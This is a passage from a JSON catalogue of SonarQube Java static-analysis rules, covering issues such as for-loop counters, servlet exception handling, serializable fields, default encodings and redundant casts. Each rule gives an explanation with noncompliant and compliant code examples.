omitted. </li>\n  <li> Members annotated with the <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed\n  to make the code testable. </li>\n</ul>\n<pre>\nclass Cone {\n  @VisibleForTesting\n  Logger logger; // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2039","summary":"Member variable visibility should be specified","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This\nis doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or\ninterface per file.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1996","summary":"Files should contain only one top-level class or interface each","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The counter of a <code>for</code> loop should be updated in the loopâs increment clause. The purpose of a <code>for</code> loop is to iterate over\na range using a counter variable. It should not be used for other purposes, and alternative loops should be used in those cases.</p>\n<p>If the counter is not updated, the loop will be infinite with a constant counter variable. If this is intentional, use a <code>while</code> or\n<code>do</code> <code>while</code> loop instead of a <code>for</code> loop.</p>\n<p>If the counter variable is updated within the loopâs body, try to move it to the increment clause. If this is impossible due to certain conditions,\nreplace the <code>for</code> loop with a <code>while</code> or <code>do</code> <code>while</code> loop.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Move the counter variable update to the loopâs increment clause.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (int i = 0; i &lt; 10; ) { // Noncompliant, i not updated in increment clause\n  // ...\n  i++;\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nint sum = 0\nfor (int i = 0; i &lt; 10; sum++) { // Noncompliant, i not updated in increment clause\n  // ...\n  i++;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfor (i = 0; i &lt; 10; i++) { // Compliant\n  // ...\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nint sum = 0\nfor (int i = 0; i &lt; 10; i++) { // Compliant\n  // ...\n  sum++;\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>If this is impossible and the counter variable must be updated in the loopâs body, use a <code>while</code> or <code>do</code> <code>while</code>\nloop instead.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nfor (int sum = 0; sum &lt; 10) { // Noncompliant, sum not updated in increment clause\n  // ...\n  if (condition) sum++;\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nint sum = 0;\nwhile (sum &lt; 10) { // Compliant\n  // ...\n  if (condition) sum++;\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1994","summary":"\"for\" loop increment clauses should modify the loops' counters","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Servlets are components in Java web development, responsible for processing HTTP requests and generating responses. In this context, exceptions are\nused to handle and manage unexpected errors or exceptional conditions that may occur during the execution of a servlet.</p>\n<p>Catching exceptions within the servlet allows us to convert them into meaningful, user-friendly messages. Otherwise, failing to catch exceptions\nwill propagate them to the servlet container, where the default error-handling mechanism may impact the overall security and stability of the\nserver.</p>\n<p>Possible security problems are:</p>\n<ol>\n  <li> <strong>Vulnerability to denial-of-service attacks:</strong> Not caught exceptions can leave the servlet container in an unstable state, which\n  can exhaust the available resources and make the system unavailable in the worst cases. </li>\n  <li> <strong>Exposure of sensitive information:</strong> Exceptions handled by the servlet container, by default, expose detailed error messages or\n  debugging information to the user, which may contain sensitive data such as stack traces, database connection, or system configuration. </li>\n</ol>\n<p>Unfortunately, servlet method signatures do not force developers to handle <code>IOException</code> and <code>ServletException</code>:</p>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n}\n</pre>\n<p>To prevent this risk, this rule enforces all exceptions to be caught within the \"do*\" methods of servlet classes.</p>\n<h2>How to fix it</h2>\n<p>Surround all method calls that may throw an exception with a <code>try/catch</code> block.</p>\n<h3>Code examples</h3>\n<p>In the following example, the <code>getByName</code> method may throw an <code>UnknownHostException</code>.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n  InetAddress addr = InetAddress.getByName(request.getRemoteAddr()); // Noncompliant\n  //...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n  try {\n    InetAddress addr = InetAddress.getByName(request.getRemoteAddr());\n    //...\n  }\n  catch (UnknownHostException ex) {  // Compliant\n    //...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/600\">CWE-600 - Uncaught Exception in Servlet</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/-zZGBQ\">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1989","summary":"Exceptions should not be thrown from servlet methods","tags":["cwe","error-handling","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule raises an issue on a non-transient and non-serializable field within a serializable class, if said class does not have\n<code>writeObject</code> and <code>readObject</code> methods defined.</p>\n<h2>Why is this an issue?</h2>\n<p>By contract, non-static fields in a <code>Serializable</code> class must themselves be either <code>Serializable</code> or <code>transient</code>.\nEven if the class is never explicitly serialized or deserialized, it is not safe to assume that this cannot happen. For instance, under load, most\nJ2EE application frameworks flush objects to disk.</p>\n<p>An object that implements <code>Serializable</code> but contains non-transient, non-serializable data members (and thus violates the contract)\ncould cause application crashes and open the door to attackers. In general, a <code>Serializable</code> class is expected to fulfil its contract and\nnot exhibit unexpected behaviour when an instance is serialized.</p>\n<p>This rule raises an issue on:</p>\n<ul>\n  <li> Non-<code>Serializable</code> fields. </li>\n  <li> When a field is assigned a non-<code>Serializable</code> type within the class. </li>\n  <li> Collection fields when they are not <code>private</code>. Values that are not serializable could be added to these collections externally. Due\n  to type erasure, it cannot be guaranteed that the collection will only contain serializable objects at runtime despite being declared as a\n  collection of serializable types. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Consider the following scenario.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Address {\n    ...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address;  // Noncompliant, Address is not serializable\n}\n</pre>\n<p>How to fix this issue depends on the applicationâs needs. If the fieldâs value should be preserved during serialization and deserialization, you\nmay want to make the fieldâs value serializable.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Address implements Serializable {\n  private static final long serialVersionUID = 2405172041950251807L;\n\n    ...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address; // Compliant, Address is serializable\n}\n</pre>\n<p>If the fieldâs value does not need to be preserved during serialization and deserialization, mark it as <code>transient</code>. The field will be\nignored when the object is serialized. After deserialization, the field will be set to the default value corresponding to its type (e.g.,\n<code>null</code> for object references).</p>\n<pre>\npublic class Address {\n    ...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private transient Address address; // Compliant, the field is transient\n}\n</pre>\n<p>The alternative to making all members serializable or <code>transient</code> is to implement special methods which take on the responsibility of\nproperly serializing and de-serializing the object <code>writeObject</code> and <code>readObject</code>. These methods can be used to properly\n(de-)serialize an object, even though it contains fields that are not transient or serializable. Hence, this rule does not raise issues on fields of\nclasses which implement these methods.</p>\n<pre>\npublic class Address {\n    ...\n}\n\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n  private Address address; // Compliant, writeObject and readObject handle this field\n\n  private void writeObject(java.io.ObjectOutputStream out) throws IOException {\n    // Appropriate serialization logic here\n  }\n\n  private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {\n    // Appropriate deserialization logic here\n  }\n}\n</pre>\n<p>Finally, static fields are out of scope for serialization, so making a field static prevents issues from being raised.</p>\n<pre>\npublic class Person implements Serializable {\n  private static final long serialVersionUID = 1905122041950251207L;\n\n  private String name;\n\n  private static Logger log = getLogger(); // Compliant, static fields are not serialized\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/594\">CWE-594 - Saving Unserializable Objects to Disk</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/Serializable.html\">Interface Serializable - Java SE 11 API\n  Documentation</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/io/Serializable.html\">Interface Serializable - Java SE 17 API\n  Documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1948","summary":"Fields in a \"Serializable\" class should either be transient or serializable","tags":["cwe","serialization"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Using classes and methods that rely on the default system encoding can result in code that works fine in its \"home\" environment. But that code may\nbreak for customers who use different encodings in ways that are extremely difficult to diagnose and nearly, if not completely, impossible to\nreproduce when itâs time to fix them.</p>\n<p>This rule detects uses of the following classes and methods:</p>\n<ul>\n  <li> <code>FileReader</code> </li>\n  <li> <code>FileWriter</code> </li>\n  <li> String constructors with a <code>byte[]</code> argument but no <code>Charset</code> argument\n    <ul>\n      <li> <code>String(byte[] bytes)</code> </li>\n      <li> <code>String(byte[] bytes, int offset, int length)</code> </li>\n    </ul>  </li>\n  <li> <code>String.getBytes()</code> </li>\n  <li> <code>String.getBytes(int srcBegin, int srcEnd, byte[] dst, int dstBegin)</code> </li>\n  <li> <code>InputStreamReader(InputStream in)</code> </li>\n  <li> <code>OutputStreamWriter(OutputStream out)</code> </li>\n  <li> <code>ByteArrayOutputStream.toString()</code> </li>\n  <li> Some <code>Formatter</code> constructors\n    <ul>\n      <li> <code>Formatter(String fileName)</code> </li>\n      <li> <code>Formatter(File file)</code> </li>\n      <li> <code>Formatter(OutputStream os)</code> </li>\n    </ul>  </li>\n  <li> Some <code>Scanner</code> constructors\n    <ul>\n      <li> <code>Scanner(File source)</code> </li>\n      <li> <code>Scanner(Path source)</code> </li>\n      <li> <code>Scanner(InputStream source)</code> </li>\n    </ul>  </li>\n  <li> Some <code>PrintStream</code> constructors\n    <ul>\n      <li> <code>PrintStream(File file)</code> </li>\n      <li> <code>PrintStream(OutputStream out)</code> </li>\n      <li> <code>PrintStream(OutputStream out, boolean autoFlush)</code> </li>\n      <li> <code>PrintStream(String fileName)</code> </li>\n    </ul>  </li>\n  <li> Some <code>PrintWriter</code> constructors\n    <ul>\n      <li> <code>PrintWriter(File file)</code> </li>\n      <li> <code>PrintWriter(OutputStream out)</code> </li>\n      <li> <code>PrintWriter(OutputStream out, boolean autoFlush)</code> </li>\n      <li> <code>PrintWriter(String fileName)</code> </li>\n    </ul>  </li>\n  <li> methods from Apache commons-io library which accept an encoding argument when that argument is null, and overloads of those methods that omit\n  the encoding argument\n    <ul>\n      <li> <code>IOUtils.copy(InputStream, Writer)</code> </li>\n      <li> <code>IOUtils.copy(Reader, OutputStream)</code> </li>\n      <li> <code>IOUtils.readLines(InputStream)</code> </li>\n      <li> <code>IOUtils.toByteArray(Reader)</code> </li>\n      <li> <code>IOUtils.toByteArray(String)</code> </li>\n      <li> <code>IOUtils.toCharArray(InputStream)</code> </li>\n      <li> <code>IOUtils.toInputStream(TypeCriteria.subtypeOf(CharSequence))</code> </li>\n      <li> <code>IOUtils.toString(byte[])</code> </li>\n      <li> <code>IOUtils.toString(URI)</code> </li>\n      <li> <code>IOUtils.toString(URL)</code> </li>\n      <li> <code>IOUtils.write(char[], OutputStream)</code> </li>\n      <li> <code>IOUtils.write(CharSequence, OutputStream)</code> </li>\n      <li> <code>IOUtils.writeLines(Collection, String, OutputStream)</code> </li>\n      <li> <code>FileUtils.readFileToString(File)</code> </li>\n      <li> <code>FileUtils.readLines(File)</code> </li>\n      <li> <code>FileUtils.write(File, CharSequence)</code> </li>\n      <li> <code>FileUtils.write(File, CharSequence, boolean)</code> </li>\n      <li> <code>FileUtils.writeStringToFile(File, String)</code> </li>\n    </ul>  </li>\n</ul>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/pzdGBQ\">CERT, STR04-J.</a> - Use compatible character encodings when communicating string data\n  between JVMs </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ujZGBQ\">CERT, STR50-J.</a> - Use the appropriate method for counting characters in a string\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1943","summary":"Classes and methods that rely on the default system encoding should not be used","tags":["unpredictable","cert","i18n"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Javaâs <code>import</code> mechanism allows the use of simple class names. Therefore, using a class' fully qualified name in a file that\n<code>import</code>s the class is redundant and confusing.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nimport java.util.List;\nimport java.sql.Timestamp;\n\n//...\n\njava.util.List&lt;String&gt; myList;  // Noncompliant\njava.sql.Timestamp tStamp; // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport java.util.List;\nimport java.sql.Timestamp;\n\n//...\n\nList&lt;String&gt; myList;\nTimestamp tStamp;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1942","summary":"Simple class names should be used","tags":["confusing","redundant"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>For the sake of clarity, variables should be declared as close to where theyâre used as possible. This is particularly true when considering\nmethods that contain early returns and the potential to throw exceptions. In these cases, it is not only pointless, but also confusing to declare a\nvariable that may never be used because conditions for an early return are met first.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n  MyClass foo = new MyClass(a);  // Noncompliant; not used before early return\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic boolean isConditionMet(int a, int b) {\n  int difference = a - b;\n\n  if (difference &lt; 0) {\n    return false;\n  }\n\n  // ...\n\n  MyClass foo = new MyClass(a);\n  if (foo.doTheThing()) {\n    return true;\n  }\n  return false;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1941","summary":"Variables should not be declared before they are relevant","tags":["brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif ( !(a == 2)) { ...}  // Noncompliant\nboolean b = !(i &lt; 10);  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif (a != 2) { ...}\nboolean b = (i &gt;= 10);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1940","summary":"Boolean checks should not be inverted","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>All classes extend <code>Object</code> implicitly. Doing so explicitly is redundant.</p>\n<p>Further, declaring the implementation of an interface <em>and</em> one if its parents is also redundant. If you implement the interface, you also\nimplicitly implement its parents and thereâs no need to do so explicitly.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo\n    extends Object // Noncompliant\n    implements MyFace, MyOtherFace {  // Noncompliant\n  //...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic interface MyFace {\n  // ...\n}\n\npublic interface MyOtherFace extends MyFace {\n  // ...\n}\n\npublic class Foo implements MyOtherFace {\n  //...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1939","summary":"Extensions and implementations should not be redundant","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Casting expressions are utilized to convert one data type to another, such as transforming an integer into a string. This is especially crucial in\nstrongly typed languages like C, C++, C#, Java, Python, and others.</p>\n<p>However, there are instances where casting expressions are not needed. These include situations like:</p>\n<ul>\n  <li> casting a variable to its own type </li>\n  <li> casting a subclass to a parent class (in the case of polymorphism) </li>\n  <li> the programming language is capable of automatically converting the given type to another </li>\n</ul>\n<p>These scenarios are considered unnecessary casting expressions. They can complicate the code and make it more difficult to understand, without\noffering any advantages.</p>\n<p>As a result, itâs generally advised to avoid unnecessary casting expressions. Instead, rely on the languageâs type system to ensure type safety and\ncode clarity.</p>\n<h3>Exceptions</h3>\n<p>Casting may be required to distinguish the method to call in the case of overloading:</p>\n<pre>\nclass A {}\nclass B extends A{}\nclass C {\n  void fun(A a){}\n  void fun(B b){}\n\n  void foo() {\n    B b = new B();\n    fun(b);\n    fun((A) b); // Compliant, required to call the first method so cast is not redundant.\n  }\n}\n</pre>\n<h2>How to fix it</h2>\n<p>To fix your code remove the unnecessary casting expression.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Example {\n    public void example(List&lt;String&gt; list) {\n        for (String item: (List&lt;String&gt;) list) {  // Noncompliant, Remove this unnecessary cast to \"List\".\n          //...\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Example {\n    public void example() {\n        for (String foo : getFoos()) {\n          //...\n        }\n    }\n\n    public List&lt;String&gt; getFoos() {\n        return List.of(\"foo1\", \"foo2\");\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Geeksforgeeks - <a href=\"https://www.geeksforgeeks.org/type-conversion-java-examples/\">Type conversion in Java with Examples</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Type_conversion\">Type Conversion</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Strong_and_weak_typing\">Strong and Weak Typing</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Polymorphism_(computer_science)\"> Polymorphism (Computer Science)</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1905","summary":"Redundant casts should not be used","tags":["redundant","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Code is sometimes annotated as deprecated by developers maintaining libraries or APIs to indicate that the method, class, or other programming\nelement is no longer recommended for use. This is typically due to the introduction of a newer or more effective alternative. For example, when a\nbetter solution has been identified, or when the existing code presents potential errors or security risks.</p>\n<p>Deprecation is a good practice because it helps to phase out obsolete code in a controlled manner, without breaking existing software that may\nstill depend on it. It is a way to warn other developers not to use the deprecated element in new code, and to replace it in existing code when\npossible.</p>\n<p>Deprecated classes, interfaces, and their members should not be used, inherited or extended because they will eventually be removed. The\ndeprecation period allows you to make a smooth transition away from the aging, soon-to-be-retired technology.</p>\n<p>Check the documentation or the deprecation message to understand why the code was deprecated and what the recommended alternative is.</p>\n<pre>\n/**\n * @deprecated  As of release 1.3, replaced by {@link #Foo}\n */\n@Deprecated\npublic class Fum { ... }\n\npublic class Foo {\n  /**\n   * @deprecated  As of release 1.7, replaced by {@link #newMethod()}\n   */\n  @Deprecated\n  public void oldMethod() { ... }\n\n  public void newMethod() { ... }\n}\n\npublic class Bar extends Foo {\n  public void oldMethod() { ... } // Noncompliant; don't override a deprecated method\n}\n\npublic class Baz extends Fum {  // Noncompliant; Fum is deprecated\n  public void myMethod() {\n    Foo foo = new Foo();\n    foo.oldMethod();  // Noncompliant; oldMethod method is deprecated\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/477\">CWE-477 - Use of Obsolete Functions</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1874","summary":"\"@Deprecated\" code should not be used","tags":["cwe","obsolete","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an objectâs type based\non its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted\nclass and thereby gain trusted access.</p>\n<p>Instead, the <code>instanceof</code> operator or the <code>Class.isAssignableFrom()</code> method should be used to check the objectâs underlying\ntype.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npackage computer;\nclass Pear extends Laptop { ... }\n\npackage food;\nclass Pear extends Fruit { ... }\n\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (\"Pear\".equals(item.getClass().getSimpleName())) {  // Noncompliant\n      return true;  // Results in throwing away week-old computers\n    }\n    return false;\n  }\n\n  public boolean isList(Class&lt;T&gt; valueClass) {\n    if (List.class.getName().equals(valueClass.getName())) {  // Noncompliant\n      return true;\n    }\n    return false;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (item instanceof food.Pear) {\n      return true;\n    }\n    return false;\n  }\n\n  public boolean isList(Class&lt;T&gt; valueClass) {\n    if (valueClass.isAssignableFrom(List.class)) {\n      return true;\n    }\n    return false;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/486\">CWE-486 - Comparison of Classes by Name</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/eDdGBQ\">CERT, OBJ09-J.</a> - Compare classes and not class names </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1872","summary":"Classes should not be compared by name","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When the same code is duplicated in two or more separate branches of a conditional, it can make the code harder to understand, maintain, and can\npotentially introduce bugs if one instance of the code is changed but others are not.</p>\n<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at\nbest duplicate code, and at worst a coding error.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nif (a &gt;= 0 &amp;&amp; a &lt; 10) {\n  doFirstThing();\n  doTheThing();\n}\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse if (a &gt;= 20 &amp;&amp; a &lt; 50) {\n  doFirstThing();\n  doTheThing();  // Noncompliant; duplicates first condition\n}\nelse {\n  doTheRest();\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nswitch (i) {\n  case 1:\n    doFirstThing();\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:  // Noncompliant; duplicates case 1's implementation\n    doFirstThing();\n    doSomething();\n    break;\n  default:\n    doTheRest();\n}\n</pre>\n<p>If the same logic is truly needed for both instances, then:</p>\n<ul>\n  <li> in an <code>if</code> chain they should be combined </li>\n</ul>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nif ((a &gt;= 0 &amp;&amp; a &lt; 10) || (a &gt;= 20 &amp;&amp; a &lt; 50)) { // Compliant\n  doFirstThing();\n  doTheThing();\n}\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse {\n  doTheRest();\n}\n</pre>\n<ul>\n  <li> for a <code>switch</code>, one should fall through to the other </li>\n</ul>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nswitch (i) {\n  case 1:\n  case 3: // Compliant\n    doFirstThing();\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  default:\n    doTheRest();\n}\n</pre>\n<p>When all blocks are identical, either this rule will trigger if there is no default clause or rule {rule:java:S3923} will raise if there is a\ndefault clause.</p>\n<h3>Exceptions</h3>\n<p>Unless all blocks are identical, blocks in an <code>if</code> chain that contain a single line of code are ignored. The same applies to blocks in a\n<code>switch</code> statement that contains a single line of code with or without a following <code>break</code>.</p>\n<pre>\nif (a == 1) {\n  doSomething();  // Compliant, usually this is done on purpose to increase the readability\n} else if (a == 2) {\n  doSomethingElse();\n} else {\n  doSomething();\n}\n</pre>\n<h2>Resources</h2>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S3923} - All branches in a conditional structure should not have exactly the same implementation </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-1871","summary":"Two branches in a conditional structure should not have exactly the same implementation","tags":["design","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"DISTINCT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first\none with a condition that evaluates to <code>true</code>.</p>\n<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, itâs simply dead code and\nat worst, itâs a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (param == 1)\n  openWindow();\nelse if (param == 2)\n  closeWindow();\nelse if (param == 1)  // Noncompliant\n 